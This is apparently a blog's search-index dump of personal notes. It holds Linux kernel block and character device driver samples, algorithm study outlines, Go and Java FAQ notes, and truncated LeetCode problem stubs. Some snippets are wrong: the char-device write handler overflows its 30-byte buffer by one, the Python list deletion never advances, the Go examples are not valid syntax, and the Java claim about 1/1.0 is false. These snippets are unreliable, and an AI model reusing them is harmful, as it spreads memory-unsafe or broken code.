block_device-&gt;data = kmalloc(block_device-&gt;capacity &lt;&lt; 9, GFP_KERNEL);    if (block_device-&gt;data == NULL) &#123;        printk(&quot;Failed to allocate device IO buffer\\n&quot;);        unregister_blkdev(dev_major, &quot;testblk&quot;);        kfree(block_device);        return -ENOMEM;    &#125;    printk(&quot;Initializing queue\\n&quot;);    block_device-&gt;queue = blk_mq_init_sq_queue(&amp;block_device-&gt;tag_set, &amp;mq_ops, 128, BLK_MQ_F_SHOULD_MERGE);    if (block_device-&gt;queue == NULL) &#123;        printk(&quot;Failed to allocate device queue\\n&quot;);        kfree(block_device-&gt;data);        unregister_blkdev(dev_major, &quot;testblk&quot;);        kfree(block_device);        return -ENOMEM;    &#125;    /* Set driver&#x27;s structure as user data of the queue */    block_device-&gt;queue-&gt;queuedata = block_device;    /* Allocate new disk */    block_device-&gt;gdisk = alloc_disk(1);    /* Set all required flags and data */    block_device-&gt;gdisk-&gt;flags = GENHD_FL_NO_PART_SCAN;    block_device-&gt;gdisk-&gt;major = dev_major;    block_device-&gt;gdisk-&gt;first_minor = 0;    block_device-&gt;gdisk-&gt;fops = &amp;blockdev_ops;    block_device-&gt;gdisk-&gt;queue = block_device-&gt;queue;    block_device-&gt;gdisk-&gt;private_data = block_device;    /* Set device name as it will be represented in /dev */    strncpy(block_device-&gt;gdisk-&gt;disk_name, &quot;blockdev\\0&quot;, 9);    printk(&quot;Adding disk %s\\n&quot;, block_device-&gt;gdisk-&gt;disk_name);    /* Set device capacity */    set_capacity(block_device-&gt;gdisk, block_device-&gt;capacity);    /* Notify kernel about new disk device */    add_disk(block_device-&gt;gdisk);    return 0;&#125;static void __exit myblock_driver_exit(void)&#123;    /* Don&#x27;t forget to cleanup everything */    if (block_device-&gt;gdisk) &#123;        del_gendisk(block_device-&gt;gdisk);        put_disk(block_device-&gt;gdisk);    &#125;    if (block_device-&gt;queue) &#123;        blk_cleanup_queue(block_device-&gt;queue);    &#125;    kfree(block_device-&gt;data);    unregister_blkdev(dev_major, &quot;testblk&quot;);    kfree(block_device);&#125;module_init(myblock_driver_init);module_exit(myblock_driver_exit);MODULE_LICENSE(&quot;GPL&quot;);\nchar\nstream of chars\n#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/cdev.h&gt;#include &lt;linux/device.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/uaccess.h&gt;#include &lt;linux/fs.h&gt;#define MAX_DEV 2static int mychardev_open(struct inode *inode, struct file *file);static int mychardev_release(struct inode *inode, struct file *file);static long mychardev_ioctl(struct file *file, unsigned int cmd, unsigned long arg);static ssize_t mychardev_read(struct file *file, char __user *buf, size_t count, loff_t *offset);static ssize_t mychardev_write(struct file *file, const char __user *buf, size_t count, loff_t *offset);static const struct file_operations mychardev_fops = &#123;    .owner      = THIS_MODULE,    .open       = mychardev_open,    .release    = mychardev_release,    .unlocked_ioctl = mychardev_ioctl,    .read       = mychardev_read,    .write       = mychardev_write&#125;;struct mychar_device_data &#123;    struct cdev cdev;&#125;;static int dev_major = 0;static struct class *mychardev_class = NULL;static struct mychar_device_data mychardev_data[MAX_DEV];static int mychardev_uevent(struct device *dev, struct kobj_uevent_env *env)&#123;    add_uevent_var(env, &quot;DEVMODE=%#o&quot;, 0666);    return 0;&#125;static int __init mychardev_init(void)&#123;    int err, i;    dev_t dev;    err = alloc_chrdev_region(&amp;dev, 0, MAX_DEV, &quot;mychardev&quot;);    dev_major = MAJOR(dev);    mychardev_class = class_create(THIS_MODULE, &quot;mychardev&quot;);    mychardev_class-&gt;dev_uevent = mychardev_uevent;    for (i = 0; i &lt; MAX_DEV; i++) &#123;        cdev_init(&amp;mychardev_data[i].cdev, &amp;mychardev_fops);        mychardev_data[i].cdev.owner = THIS_MODULE;        cdev_add(&amp;mychardev_data[i].cdev, MKDEV(dev_major, i), 1);        device_create(mychardev_class, NULL, MKDEV(dev_major, i), NULL, &quot;mychardev-%d&quot;, i);    &#125;    return 0;&#125;static void __exit mychardev_exit(void)&#123;    int i;    for (i = 0; i &lt; MAX_DEV; i++) &#123;        device_destroy(mychardev_class, MKDEV(dev_major, i));    &#125;    class_unregister(mychardev_class);    class_destroy(mychardev_class);    unregister_chrdev_region(MKDEV(dev_major, 0), MINORMASK);&#125;static int mychardev_open(struct inode *inode, struct file *file)&#123;    printk(&quot;MYCHARDEV: Device open\\n&quot;);    return 0;&#125;static int mychardev_release(struct inode *inode, struct file *file)&#123;    printk(&quot;MYCHARDEV: Device close\\n&quot;);    return 0;&#125;static long mychardev_ioctl(struct file *file, unsigned int cmd, unsigned long arg)&#123;    printk(&quot;MYCHARDEV: Device ioctl\\n&quot;);    return 0;&#125;static ssize_t mychardev_read(struct file *file, char __user *buf, size_t count, loff_t *offset)&#123;    uint8_t *data = &quot;Hello from the kernel world!\\n&quot;;    size_t datalen = strlen(data);    printk(&quot;Reading device: %d\\n&quot;, MINOR(file-&gt;f_path.dentry-&gt;d_inode-&gt;i_rdev));    if (count &gt; datalen) &#123;        count = datalen;    &#125;    if (copy_to_user(buf, data, count)) &#123;        return -EFAULT;    &#125;    return count;&#125;static ssize_t mychardev_write(struct file *file, const char __user *buf, size_t count, loff_t *offset)&#123;    size_t maxdatalen = 30, ncopied;    uint8_t databuf[maxdatalen];    printk(&quot;Writing device: %d\\n&quot;, MINOR(file-&gt;f_path.dentry-&gt;d_inode-&gt;i_rdev));    if (count &lt; maxdatalen) &#123;        maxdatalen = count;    &#125;    ncopied = copy_from_user(databuf, buf, maxdatalen);    if (ncopied == 0) &#123;        printk(&quot;Copied %zd bytes from the user\\n&quot;, maxdatalen);    &#125; else &#123;        printk(&quot;Could&#x27;t copy %zd bytes from the user\\n&quot;, ncopied);    &#125;    databuf[maxdatalen] = 0;    printk(&quot;Data from the user: %s\\n&quot;, databuf);    return count;&#125;MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;Oleg Kutkov &lt;elenbert@gmail.com&gt;&quot;);module_init(mychardev_init);module_exit(mychardev_exit);/* https://olegkutkov.me/2018/03/14/simple-linux-character-device-driver/ */","categories":["Linux","FAQ"]},{"title":"combinatorial-objects","url":"/2021/08/combinatorial-objects/","content":"動機\n寫給自己的leetcode筆記\n\n搜尋與走訪\n一個是找有沒有，一個是記下所有符合條件的東西\n但本質都一樣，都要讓狀態變化，去看對不對，而走訪就是把資料拆分成一定單位\n怎麼拆分就是依據需要的狀態(題目需求)與本身是什麼資料結構(List, Tree, Graph)\n搜尋範圍\n讓搜尋範圍合理的改變(把不需要的劃掉，或是保留可能性)\n\n太小變大\n太大變小\n用完後變小\n並保持住需要的屬性(order, 大小, 回文, 題目定的規則)\n\n拆分的方式\n\n\nList\n\ntraversal\n\n頭到尾 (可以看成時間，見188)\n\ngreedy (看class schedule 3)\n\n選大 (結果最大)\n選小 (保留可能性)\n\n找出限制，以此sort，而這個限制就是構成搜尋範圍的要素\n\n\n\n\n\n\n從中點走(一半)\n\nbinary search\ndivide and conquer\n\n從中點往外擴\n\n\n\n\n兩邊左右走\n\ntwo pointer\n\n\nsublist &amp; range\n\nsliding window\nprefix sum\n\n\n有序\n\nsort\nheap\n\n\n\n\n多list合一\n\ntrie\nmerge\npointer as each list\nmutual recursion\n\n把DP想成一個list(或是說做完動作後的狀態)，之後開始merge\n188. Best Time to Buy and Sell Stock IV\n\n\n\n\n\n\ntree\n\n根與子樹\n\nDFS\n\n前中後序 (greedy)\n\nthreading\n\n\nDP &amp; 記憶法\n\nDP想成stream\n\n\nBinary search tree\n\n大小\n數字範圍\n\n\n\n\nBFS\n\n\nlevel by level\n\nBFS\nDFS with other pointer\n\n\n左到右、右到左\n\nDFS\nLine sweeping\n\n\n\n\ngraph\n\n起點終點\n\nDFS\nBFS\n\n\n外到內，內到外\n\nBFS\n\n\n\n\nmath &amp; bit operation\n\nxor\neven &amp; odd\nrandom\n\n平均的出現\n\n\nbit 與 bit之間是獨立的，如果不是當成list用就是一起用bit operation\n為了保持條件操作，進而平攤操作\n\n1172. Dinner Plate Stacks\n\n\n\n\n綜合技\n\n用別的資料結構描述其他變數\n\nclass schedule 3\n\n\n把資料encode在同一個資料結構上以合併走訪\n\nSort Items by Groups Respecting Dependencies\nPrefix and Suffix Search\n\n\n\n\n\n","categories":["Algorithm","Tips"]},{"title":"github掛掉導致Push失敗","url":"/2021/08/github-down/","content":"動機\nPush失敗時一直噴\n! [remote rejected] master -&gt; master (failure)\n\nSol\n看github status\n\n所以就等他好就ok了\n","categories":["Utils","Small project","CI","Github Action"]},{"title":"golang與繼承與template method pattern","url":"/2021/08/golang-inherence-template-method-pat/","content":"動機\n\npromoted attr只是一種語法糖，不是繼承 (沒有subtype)\npromoted attr只是展開\n把struct想成Let Over Lambda\nstruct是value type\ninterface就是看有沒有function\n\n\npromoted attr &amp; 繼承\ntype a struct &#123;&#125;type b struct &#123;  a  string&#125;\nb展開了a與string，但這不代表b是a的subtype!!\n只是沒有name的欄位\n所以a還是a，b還是b\n但正如promoted attr，golang提供語法糖，promoted method，讓使用者以為有繼承\npointer type\ntype a struct &#123;&#125;var x avar y *a\nx與y的type不同，如果是java或是python只有*a\nmethod &amp; interface\ntype a interface &#123;  f1()&#125;type struct x &#123;&#125;func (_ x) f1() &#123;&#125;//var g *a//g = &amp;x&#123;&#125;var g ag = x&#123;&#125;// g = &amp;x&#123;&#125;\n上面只有x有實作a，但是*x沒有!!\ntype a interface &#123;  f1()&#125;type struct x &#123;&#125;func (_ *x) f1() &#123;&#125;var g ag = &amp;x&#123;&#125;\n另外注意就算是物件指標，還是a，不是*a\ntemplate method pattern\ntype Iface &#123;  f1()  f2()&#125;type struct a &#123;  x int&#125;type struct b &#123;  x float64&#125;func (this *a) f1() &#123;  fmt.Println(this.x)  this.f2()&#125;func (this *a) f2() &#123;  fmt.Println(123)&#125;func (this *b) f1() &#123;  this.f2()  fmt.Println(this.x)&#125;func (this *b) f2() &#123;  fmt.Println(234)&#125;func template(f Iface, val int) &#123;  fmt.Println(val)  f.f1()  f.f2()&#125;\n我google到的template method需要生struct，在裡面放實作iface的struct，十分繞\n倒不如把struct當成lambda的第一層(let)，之後的method當成大二層lambda\n(define (a x)  (lambda ()    ...))","categories":["Golang","Tips"]},{"title":"刪linked list的好做法??","url":"/2021/08/good-taste-del-node/","content":"動機\nLinus Torvalds的雙層ptr的推廣文\n\n原本刪node的方式\nptr指到node，所以要記錄prev，因為不知道下一個是誰，還要處理在head刪的問題\n\ndef delNode(head, target):  prev, cur = None, head  while cur:    if cur is target:      if prev:        prev.next = cur.next      else:        return cur.next  return head\n用雙層ptr\n現在我們看next本身!!\nnext本身有\n\n自己的node下一步到哪\n下一個node的位置\n\n所以只要看到下一個node是target就可以直接改next!!\n\nNode* delNode(Node* head, Node* target) &#123;  Node** next = &amp;(head-&gt;next);  for (;*next &amp;&amp; *next != target; next = &amp;(*next)-&gt;next) ;  // 當跳出去時一個是到底，一個是下一個是target  if (*next)    *next = target-&gt;next; // 直接改next的內容&#125;\nRef\nLinked lists, pointer tricks and good taste\n","categories":["C++","Tips"]},{"title":"java的faq","url":"/2021/08/java-faq/","content":"動機\n就faq\n\nOO\n\n物件導向的特徵\n\n\n封裝\n多型\n繼承\n\n\nOverload和Override差在\n\n\nOverload是同class同名的method但有不同的signatrue\nOverride child class把同名同signatrue的method蓋掉\n\n\nequals()與==\n\n\nequals是比值\n\n因為他是method可以被蓋所以可以比值\n\n所以要一起改hashcode\n\n\n\n\n==是比記憶體位置\n\n這是operator不能override只能照設定的來\n\n\n两个对象的 hashCode()相同，则 equals()也一定为 true，对吗？\n\nString str1 = &quot;通话&quot;;String str2 = &quot;重地&quot;;System.out.println(String.format(&quot;str1：%d | str2：%d&quot;,  str1.hashCode(),str2.hashCode()));System.out.println(str1.equals(str2));\n\nPrivate, Public, Protected\n\n\nprivate: class scope\nprotected: inherence scope\npublic: whatever\ndefault (無修飾元): file(package) scope\n\njava\n\ntype\n\n\nprimitive\n\nbyte\nint\nshort\n\nshort a; a+=1;\n\na = (short) (a+1)\n\n\n\n\nchar\nlong\nfloat\n\n1.1F\n\n\ndouble\n\n1.1\n\n\nboolean\n\n\nObject (有人叫他引用type)\n\n\nint與Integer差在\n\n\n一個是primitive一個是Object\n\n大小，使用方式都不一樣\n\n\n\n\nString與StringBuffer差在\n\n\nString不可改動，每次+都是生新的String\nStringBuffer可以改，像c的char[]\n\n\nException與Runtime Exception與Error差在\n\n\nException會被宣告在method signatrue(throws)\n\n一定要被catch，compiler會檢查\n\n\nRuntime Exception就是一般的例外\n\n丟了會stack trace back\n沒人接就壞掉\n\n\nError是硬體出事了，當他出現時世界就毀滅了\n\n\nArrayList,Vector, LinkedList差在\n\n\nLinkedList就是linkedlist，但是是雙向\nArrayList就是C++的vector\n\nVector就是有synchronized的ArrayList\n\n但現在都用Concurrent開頭的\n\n\n\n\n\n\nHashMap和Hashtable差在\n\n\nHashMap不是thread safe，能放null\nHashtable有synchronized\n\n\nfinal, finally, finalize差在\n\n\nfinal 這欄位不可變、不可繼承、不可override\n\nfinal的instant variable沒有default value\n\n\nfinally不論有沒有例外，總是執行\n\n就算try裡面有放return也會跑!!\n\n\nfinalize被GC會被call的method\n\n現在用cleaner!!\n\n\n\n\ncompareTo() vs equals() in String\n\n\ncompareTo就是一般比較的函數，ruby的&lt;=&gt;\nequals只有boolean\n\n\ninterface default &amp; static method\n\n\ndefault用在不用實做某些method的時候 (變得像abstrac class)\n\n可以延伸到abstract class與interface的差異\n\nabstract class不一定要實作所有abstract，interface要\nabstract class的method可以access attribute，interface只有常數\n\n\n\n\nstatic method就是跟著interface的method，Iface.method()\n\n\nAnonymous Inner Class\n\n\n很像clousre，可以直接new interface接要override的method\n所以也沒辦法直接extend，implements\n\npublic class AnonymousInnerClass &#123;    public static void main(String[] args) &#123;        // Ex. Anonymous Inner Class        new Thread() &#123;            @Override            public void run() &#123;                // code...                System.out.println(&quot;Anonymous Inner Class&quot;);            &#125;        &#125;.start();    &#125;&#125;\n\nCollection與Collections差在\n\n\nCollection是interface，要實作add與remove與toarray\nCollections是對Collection操作的方法，像C++的algorithm\n\n\nList、Set、Map 是否繼承自 Collection 介面\n\n\nList與Set是\nMap不是，是AbstractMap\n\n\nsleep &amp; wait\n\n\nsleep是thread睡覺，要時間到才會自己跑，不會放棄鎖\nwait是針對monitor的工作，可以讓自己睡，或是收別人的signal，會放棄鎖\n\n\n啟動一個線程是用 run() 還是 start()\n\n\nstart之後會invoke run跑需要的code\n\n\n當一個線程進入一個物件的一個 Synchronized 方法後，其它線程是否可以進入此物件的其他方法？\n\n\n要看是不是吃同一個obj\n\n如果是一般method，就沒辦法進去\nstatic method會吃class做為鎖，就可以進去\n\n\n\n\njava的記憶體\n\n\nfor runtime\n\nstack\nheap\nmethod area\n\nconst pool\n\n\n\n\ncode\nstatic\n\n\n1/0 &amp; 1/1.0\n\n\n1/0: ArithmeticException\n1/1.0: Infinite (沒有例外)\n\n\nconstructor是否可被override?\n\n\n不行，可以overload\n\n\njvm怎麼載入class\n\n\nClassLoader會根據繼承關係把class，讀進來會驗證、allocate mem、link、init static資料、生成物件讓jvm跑\n\n\n從來沒有人說過Java的Class名字必須和其檔名相同。但public class的名字必須和檔名相同\n\n// OtherThing.javaclass Something &#123;  private static void main(String[] something_to_do) &#123;     System.out.println(&quot;Do something ...&quot;);  &#125;&#125;\n\nMath.round(-1.5)\n\n\n-1\n\n\nThread state\n\n\nstart\nready\nrunning\nblocked\ndestroied\n\n\n如何deepcopy\n\n\nCloneable\nSerializable\n\n\nInversion of Control\n\n\n原本是Logic去控制資料\n有些資料其實是一起的，所以可以根據我們這邊的需求去生\n\n但也可以讓外面給 (Dependency Injection)\n\n透過setter\n透過interface (我們只call method)\n透過constructor\n再跑logic之前讓資料就定位\n\n\n之後就是有一堆framework，想描述(變成像prolog那樣)給參數這行為就有了這個詞\n這到最後可以不管程式實作了!! 它本身就是程式阿\n\n\n\nServlet\n\ncgi與servlet差在\n\n\ncgi是每次req都fork一個process去處理，之後回到parent\nservlet是會初始化只後一直處理req，等server不要時再回收\n\n\nAOP\n\n\n有些與logic無關的code但要與logic放在一起的code(log)，Aspect\n如果想分開就是要留callback的點，Joinpoint\n\n\nB+ tree\n\n\n每一個node代表一個range，下面的ptr指到符合範圍的node\n\ndesign pattern\n把object當成lambda就可以處理很多問題\n之後就是用\n\ninterface\n繼承\n包成object\n去傳需要的邏輯\n\n剩下就visitor是pattern match\ndesign pattern隨便筆記\n正規化\n讓table好join\n\n把array轉90度\n讓整個主鍵可以filter出所有欄目 (course ID, student ID去濾可以找出grade與student name，name要被割出去)\n割出去的項目只能用主鍵去濾資料\n\nnote\nGC\n每個obj都是一個node，所以每個都有\n\nindegree\n\n\n當indegree為0就被回收\n如果有loop就不會被回收\n\n\nedge\n\n\n從root做traversal，有走到就是ok\n會產生記憶體斷片、物件多會跑很久(stop the world)\n\n物件多會跑很久: 區分世代使用不同algo\n產生記憶體斷片: 一次只用整條記憶體的一半，要換時就把剩下都copy去另一邊\n\n\n\n","categories":["Java","FAQ"]},{"title":"leetcode-1004 - Max Consecutive Ones III","url":"/2021/08/leetcode-1004/","content":"動機\n基本款sliding window\n\nProblem\nGiven a binary array nums and an integer k, return the maximum number of consecutive 1's in the array if you can flip at most k 0's. Example 1:Input: nums = [1,1,1,0,0,0,1,1,1,1,0], k = 2Output: 6Explanation: [1,1,1,0,0,1,1,1,1,1,1]Bolded numbers were flipped from 0 to 1. The longest subarray is underlined.Example 2:Input: nums = [0,0,1,1,0,0,1,1,1,0,1,1,0,0,0,1,1,1,1], k = 3Output: 10Explanation: [0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,1,1,1,1]Bolded numbers were flipped from 0 to 1. The longest subarray is underlined. Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Prefix Sum","Binary Search","Sliding Window"]},{"title":"leetcode-1008 - Construct Binary Search Tree from Preorder Traversal","url":"/2021/08/leetcode-1008/","content":"動機\n你大神還是你大神，滿滿的創意\n在BST上做bsearch(太神啦)\n帶入範圍\n\nProblem\nGiven an array of integers preorder, which represents the preorder traversal of a BST (i.e., binary search tree), construct the tree and return its root.It is guaranteed that there is always possible to find a binary search tree with the given requirements for the given test cases.A binary search tree is a binary tree where for every node, any descendant of Node.left has a value strictly less than Node.val, and any descendant of Node.right has a value strictly greater than Node.val.A preorder traversal of a binary tree displays the value of the node first, then traverses Node.left, then traverses Node.right. Example 1:Input: preorder = [8,5,1,7,10,12]Output: [8,5,10,1,7,Leetcode,12]Example 2:Input: preorder = [1,3]Output: [1,null,3] Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Stack","Binary Tree","Tree","Binary Search Tree","Monotonic Stack"]},{"title":"leetcode-107 - Binary Tree Level Order Traversal II","url":"/2021/08/leetcode-107/","content":"動機\n就bfs\n\nProblem\nGiven the root of a binary tree, return the bottom-up level order traversal of its nodes' values. (i.e., from left to right, level by level from leaf to root). Example 1:Input: root = [3,9,20,null,null,15,7]Output: [[15,7],[9,20],[3]]Example 2:Input: root = [1]Output: [[1]]Example 3:Input: root = []Output: [] Constraints:The number of nodes in the tree is in the range [0, 2000].-1000 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Breadth-First Search","Binary Tree","Tree"]},{"title":"leetcode-1130 - Minimum Cost Tree From Leaf Values","url":"/2021/08/leetcode-1130/","content":"動機\nMonotonic Stack在pop時當下的狀態是\n7 3 2 .left. 1 .right. 2\nright的數字大小一定是大於1!!\nleft的數字一定是等於1\n代表說在這個區間1一定是最小的\n但哪邊是最大? 就要比較左右兩邊了\n\nProblem\nGiven an array arr of positive integers, consider all binary trees such that:Each node has either 0 or 2 children;The values of arr correspond to the values of each leaf in an in-order traversal of the tree.The value of each non-leaf node is equal to the product of the largest leaf value in its left and right subtree, respectively.Among all possible binary trees considered, return the smallest possible sum of the values of each non-leaf node. It is guaranteed this sum fits into a 32-bit integer.A node is a leaf if and only if it has zero children. Example 1:Input: arr = [6,2,4]Output: 32Explanation: There are two possible trees shown.The first has a non-leaf node sum 36, and the second has non-leaf node sum 32.Example 2:Input: arr = [4,11]Output: 44 Constraints:2 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Stack","Greedy","Monotonic Stack"]},{"title":"leetcode-117 - Populating Next Right Pointers in Each Node II","url":"/2021/08/leetcode-117/","content":"動機\n用已經建成的next去連，所以遞迴方式變得很有趣\n\nProblem\nGiven a binary treestruct Node {  int val;  Node *left;  Node *right;  Node *next;}Populate each next pointer to point to its next right node. If there is no next right node, the next pointer should be set to NULL.Initially, all next pointers are set to NULL. Follow up:You may only use constant extra space.Recursive approach is fine, you may assume implicit stack space does not count as extra space for this problem. Example 1:Input: root = [1,2,3,4,5,null,7]Output: [1,#,2,3,#,4,5,7,#]Explanation: Given the above binary tree (Figure A), your function should populate each next pointer to point to its next right node, just like in Figure B. The serialized output is in level order as connected by the next pointers, with '#' signifying the end of each level. Constraints:The number of nodes in the given tree is less than 6000.-100 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-1203 - Sort Items by Groups Respecting Dependencies","url":"/2021/08/leetcode-1203/","content":"動機\nHard題都是來看創意的\n把 group encode成起點與終點\n同時這題也是遇過最複雜的一題\n\nProblem\nThere are n items each belonging to zero or one of m groups where group[i] is the group that the i-th item belongs to and it's equal to -1 if the i-th item belongs to no group. The items and the groups are zero indexed. A group can have no item belonging to it.Return a sorted list of the items such that:The items that belong to the same group are next to each other in the sorted list.There are some relations between these items where beforeItems[i] is a list containing all the items that should come before the i-th item in the sorted array (to the left of the i-th item).Return any solution if there is more than one solution and return an empty list if there is no solution. Example 1:Input: n = 8, m = 2, group = [-1,-1,1,0,0,1,0,-1], beforeItems = [[],[6],[5],[6],[3,6],[],[],[]]Output: [6,3,4,1,5,2,0,7]Example 2:Input: n = 8, m = 2, group = [-1,-1,1,0,0,1,0,-1], beforeItems = [[],[6],[5],[6],[3],[],[4],[]]Output: []Explanation: This is the same as example 1 except that 4 needs to be before 6 in the sorted list. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Breadth-First Search","Depth-First Search","Graph","Topological Sort"]},{"title":"leetcode-1234 - Replace the Substring for Balanced String","url":"/2021/08/leetcode-1234/","content":"動機\nwindow中的東西可以亂生!!\n\nProblem\nYou are given a string containing only 4 kinds of characters 'Q', 'W', 'E' and 'R'.A string is said to be balanced if each of its characters appears n/4 times where n is the length of the string.Return the minimum length of the substring that can be replaced with any other string of the same length to make the original string s balanced.Return 0 if the string is already balanced. Example 1:Input: s = \"QWER\"Output: 0Explanation: s is already balanced.Example 2:Input: s = \"QQWE\"Output: 1Explanation: We need to replace a 'Q' to 'R', so that \"RQWE\" (or \"QRWE\") is balanced.Example 3:Input: s = \"QQQW\"Output: 2Explanation: We can replace the first \"QQ\" to \"ER\". Example 4:Input: s = \"QQQQ\"Output: 3Explanation: We can replace the last 3 'Q' to make s = \"QWER\". Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["String","Sliding Window"]},{"title":"leetcode-1235 - Maximum Profit in Job Scheduling","url":"/2021/08/leetcode-1235/","content":"動機\ntop-down: 好寫、但沒有過去的訊息\nbottom-up: 不好寫、有過去的訊息 (bsearch!!)、很好做求到此點最大的題目\n\nProblem\nWe have n jobs, where every job is scheduled to be done from startTime[i] to endTime[i], obtaining a profit of profit[i].You're given the startTime, endTime and profit arrays, return the maximum profit you can take such that there are no two jobs in the subset with overlapping time range.If you choose a job that ends at time X you will be able to start another job that starts at time X. Example 1:Input: startTime = [1,2,3,3], endTime = [3,4,5,6], profit = [50,10,40,70]Output: 120Explanation: The subset chosen is the first and fourth job. Time range [1-3]+[3-6] , we get profit of 120 = 50 + 70.Example 2: Input: startTime = [1,2,3,4,6], endTime = [3,5,10,6,9], profit = [20,20,100,70,60]Output: 150Explanation: The subset chosen is the first, fourth and fifth job. Profit obtained 150 = 20 + 70 + 60.Example 3:Input: startTime = [1,1,1], endTime = [2,3,4], profit = [5,6,4]Output: 6 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","Array","Binary Search","Sorting"]},{"title":"leetcode-1248 - Count Number of Nice Subarrays","url":"/2021/08/leetcode-1248/","content":"動機\natMost或是在回收時計算長度\n\nProblem\nGiven an array of integers nums and an integer k. A continuous subarray is called nice if there are k odd numbers on it.Return the number of nice sub-arrays. Example 1:Input: nums = [1,1,2,1,1], k = 3Output: 2Explanation: The only sub-arrays with 3 odd numbers are [1,1,2,1] and [1,2,1,1].Example 2:Input: nums = [2,4,6], k = 1Output: 0Explanation: There is no odd numbers in the array.Example 3:Input: nums = [2,2,2,1,2,2,1,2,2,2], k = 2Output: 16 Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Math","Hash Table","Sliding Window"]},{"title":"leetcode-132 - Palindrome Partitioning II","url":"/2021/08/leetcode-132/","content":"動機\n\nProblem\nGiven a string s, partition s such that every substring of the partition is a palindrome.Return the minimum cuts needed for a palindrome partitioning of s. Example 1:Input: s = \"aab\"Output: 1Explanation: The palindrome partitioning [\"aa\",\"b\"] could be produced using 1 cut.Example 2:Input: s = \"a\"Output: 0Example 3:Input: s = \"ab\"Output: 1 Constraints:t1 ","categories":["Algorithm","Leetcode"],"tags":["Dynamic Programming","String"]},{"title":"leetcode-1331 - Rank Transform of an Array","url":"/2021/08/leetcode-1331/","content":"動機\n先做這題，再看1632會比較有感覺\n\nProblem\nGiven an array of integers arr, replace each element with its rank.rrThe rank represents how large the element is. The rank has the following rules:rrrtRank is an integer starting from 1.rtThe larger the element, the larger the rank. If two elements are equal, their rank must be the same.rtRank should be as small as possible.rrr rExample 1:rrrInput: arr = [40,10,20,30]rOutput: [4,1,2,3]rExplanation: 40 is the largest element. 10 is the smallest. 20 is the second smallest. 30 is the third smallest.rrExample 2:rrrInput: arr = [100,100,100]rOutput: [1,1,1]rExplanation: Same elements share the same rank.rrrExample 3:rrrInput: arr = [37,12,28,9,100,56,80,5,12]rOutput: [5,3,4,2,8,6,7,1,3]rrr rConstraints:rrrt0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Hash Table","Sorting"]},{"title":"leetcode-1339 - Maximum Product of Splitted Binary Tree","url":"/2021/08/leetcode-1339/","content":"動機\n把不要的扣掉!!\n\nProblem\nGiven the root of a binary tree, split the binary tree into two subtrees by removing one edge such that the product of the sums of the subtrees is maximized.Return the maximum product of the sums of the two subtrees. Since the answer may be too large, return it modulo 109 + 7.Note that you need to maximize the answer before taking the mod and not after taking it. Example 1:Input: root = [1,2,3,4,5,6]Output: 110Explanation: Remove the red edge and get 2 binary trees with sum 11 and 10. Their product is 110 (11*10)Example 2:Input: root = [1,Leetcode,2,3,4,null,null,5,6]Output: 90Explanation: Remove the red edge and get 2 binary trees with sum 15 and 6.Their product is 90 (15*6)Example 3:Input: root = [2,3,9,10,7,8,6,5,4,11,1]Output: 1025Example 4:Input: root = [1,1]Output: 1 Constraints:The number of nodes in the tree is in the range [2, 5 * 104].1 ","categories":["Algorithm","Leetcode"],"tags":["Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-1346 - Check If N and Its Double Exist","url":"/2021/08/leetcode-1346/","content":"動機\n注意正負數的2倍，分別會變大變小\n\nProblem\nGiven an array arr of integers, check if there exists two integers N and M such that N is the double of M ( i.e. N = 2 * M).More formally check if there exists two indices i and j such that :ti != jt0 ","categories":["Algorithm","Leetcode"],"tags":["Array","Two Pointers","Binary Search","Hash Table","Sorting"]},{"title":"leetcode-1351 - Count Negative Numbers in a Sorted Matrix","url":"/2021/08/leetcode-1351/","content":"動機\nreverse iterator好讚\n\nProblem\nGiven a m x n matrix grid which is sorted in non-increasing order both row-wise and column-wise, return the number of negative numbers in grid. Example 1:Input: grid = [[4,3,2,-1],[3,2,1,-1],[1,1,-1,-2],[-1,-1,-2,-3]]Output: 8Explanation: There are 8 negatives number in the matrix.Example 2:Input: grid = [[3,2],[1,0]]Output: 0Example 3:Input: grid = [[1,-1],[-1,-1]]Output: 3Example 4:Input: grid = [[-1]]Output: 1 Constraints:tm == grid.lengthtn == grid[i].lengtht1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Matrix","Binary Search"]},{"title":"leetcode-1361 - Validate Binary Tree Nodes","url":"/2021/08/leetcode-1361/","content":"動機\n把需要的spec定義出來就好\n\nProblem\nYou have n binary tree nodes numbered from 0 to n - 1 where node i has two children leftChild[i] and rightChild[i], return true if and only if all the given nodes form exactly one valid binary tree.If node i has no left child then leftChild[i] will equal -1, similarly for the right child.Note that the nodes have no values and that we only use the node numbers in this problem. Example 1:Input: n = 4, leftChild = [1,-1,3,-1], rightChild = [2,-1,-1,-1]Output: trueExample 2:Input: n = 4, leftChild = [1,-1,3,-1], rightChild = [2,3,-1,-1]Output: falseExample 3:Input: n = 2, leftChild = [1,0], rightChild = [-1,-1]Output: falseExample 4:Input: n = 6, leftChild = [1,-1,-1,4,-1,-1], rightChild = [2,-1,-1,5,-1,-1]Output: false Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Union Find","Breadth-First Search","Depth-First Search","Binary Tree","Tree","Graph"]},{"title":"leetcode-1438 - Longest Continuous Subarray With Absolute Diff Less Than or Equal to Limit","url":"/2021/08/leetcode-1438/","content":"動機\nsliding window但是用heap去找window的最大最小\n\nProblem\nGiven an array of integers nums and an integer limit, return the size of the longest non-empty subarray such that the absolute difference between any two elements of this subarray is less than or equal to limit. Example 1:Input: nums = [8,2,4,7], limit = 4Output: 2 Explanation: All subarrays are: [8] with maximum absolute diff |8-8| = 0  4. [8,2,4] with maximum absolute 